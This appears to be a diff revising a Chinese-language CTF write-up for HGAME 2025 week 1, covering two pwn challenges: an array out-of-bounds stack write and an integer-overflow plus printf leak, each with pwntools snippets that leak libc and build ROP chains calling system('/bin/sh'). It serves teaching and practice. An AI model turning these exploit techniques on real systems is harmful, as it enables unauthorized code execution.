@@ -1,6 +1,6 @@
 ---
 title: "HGAMECTF 2025"
-description: "HGAME2025的一部分题解"
+description: "HGAME 2025 week1 两题：数花瓣题的数组越界改 size/idx 拿栈任意写，format 题的整数溢出接 printf 泄露。"
 pubDate: 2025-02-07
 category: wp
 tags: [writeup]
@@ -10,7 +10,7 @@ tags: [writeup]
 
 ### counting petals
 
-先看看保护
+先看保护：
 ```
     Arch:       amd64-64-little
     RELRO:      Full RELRO
@@ -21,11 +21,7 @@ tags: [writeup]
     IBT:        Enabled
     Stripped:   No
 ```
-架构 amd64，小端序
-好家伙，保护全开。
-
-看看程序，
-文案挺长的，稍微看了下，小时候玩的数花瓣游戏。
+amd64 小端，保护全开。程序是个数花瓣的小游戏，文案很长。
 
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
@@ -93,11 +89,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   return 0;
 }
 ```
-就像我标的注释一样，存在数组越位。
-而紧接数组的是，记录数组的大小的变量和储存索引的变量。
-通过覆盖，我们可以在栈上任意写。
-
-思路是这样，我们可以试试具体实现。
+`list` 声明成 `int64_t[16]`，但读入用 `idx < size` 控制、`size` 允许到 16，写到 `list[17]` 就压到了紧邻的 `idx` 和 `size` 上——数组越界。改写这两个变量，就能在栈上任意写。先试一下：
 ```python
 #先将size设置成16,才能溢出
 io.recvuntil(b'How many flowers have you prepared this time?')
@@ -117,10 +109,9 @@ io.recvuntil(b'the flower number ')
 t=0x7ffffffc00000014-0x8000000000000000
 io.sendline(str(t).encode())
 ```
-虽然将 idx 设置成了-4，但是由于++操作，是从 list[-3]开始写入数据的，也就是变量 ci 处。
-我本意是想控制 rnum 的，但是其实第二次循环还是会随机赋值一遍，其实 idx 可以不设置成负值。
+`idx` 设成 -4 后，`++idx` 让下一次写入落在 `list[-3]`，也就是 `ci` 的位置。本来想借此控制 `rnum`，但它每轮都会重新随机，所以 `idx` 其实不必设成负数。
 
-而 size 设置的大一点，可以泄露栈上的内容，例如 main 函数的返回地址__libc_start_call_main+128，从而泄露了 libc 地址。
+把 `size` 调大还能顺带泄露栈内容——比如 `main` 的返回地址 `__libc_start_call_main+128`，据此算出 libc 基址。
 
 ```python
 for i in range(4+15):
@@ -148,9 +139,7 @@ system=libc_base+libc.symbols['system']
 binsh=libc_base+next(libc.search(b'/bin/sh'))
 ```
 
-而后再进行读入循环，
-通过修改 idx 和 size,
-直接覆盖栈控制程序执行流。
+第二轮再调 `idx` / `size`，让下一次写入正好落在 `rbp+8`，直接 ROP。
 
 ```python
 #先将size设置成16,才能溢出
@@ -180,9 +169,7 @@ io.sendline(str(binsh).encode())
 io.recvuntil(b'the flower number ')
 io.sendline(str(system).encode())
 ```
-以上
-
-最后附上完整 exp:
+就到手了。完整 exp：
 ```python
 from pwn import *
 
@@ -265,7 +252,7 @@ io.interactive()
 
 ### format
 
-老样子，先看看保护
+先看保护：
 ```
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
@@ -276,10 +263,7 @@ io.interactive()
     IBT:        Enabled
     Stripped:   No
 ```
-架构 amd64，小端序
-PIE 没开,canary 也没开
-
-程序还挺简单
+amd64 小端，PIE 和 canary 都没开。程序很短：
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
@@ -317,8 +301,7 @@ ssize_t __fastcall vuln(unsigned int a1)
 }
 ```
 
-本来想通过 printf(format)整点活的，但是发现 format 就 3 个字节长，想不出来，就先泄露个栈地址。
-索性先去看看整数溢出，输入 v5 为-1
+本来想用 `printf(format)` 直接打格式化字符串，但 `format` 只有 4 字节，凑不出有用的格式串，先泄露一个栈地址。顺手看整数溢出：`v5` 输入 -1，传给 `read` 的长度就变成极大值。
 ```python
 io.recvuntil(b'n = ')
 io.sendline(b'1')
@@ -334,7 +317,7 @@ log.success(f'buf: {hex(buf)}')
 io.recvuntil(b'n = ')
 io.send(b'-1')
 ```
-然后想着构造栈，跳回 printf(format)，以此泄露 libc
+接着构造栈，跳回 `printf(format)` 泄露 libc：
 ```python
 #这里覆盖了rbp,控制了栈帧
 payload = b'a'*5+p64(buf-0x18)+p64(0x4012CF)+b'%3$p'
@@ -358,16 +341,14 @@ binsh = libc_base+next(libc.search(b'/bin/sh'))
 log.success(f'binsh: {hex(binsh)}')
 ```
 
-然后再来一遍，直接覆盖栈控制程序执行流
+再来一遍，这次直接覆盖返回地址 ROP：
 ```python
 payload = b'a'*4+p64(buf-0x18)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
 io.sendline(payload)
 
 io.interactive()
 ```
-以上
-
-最后附上完整 exp:
+flag 到手。完整 exp：
 ```python
 from pwn import *
 
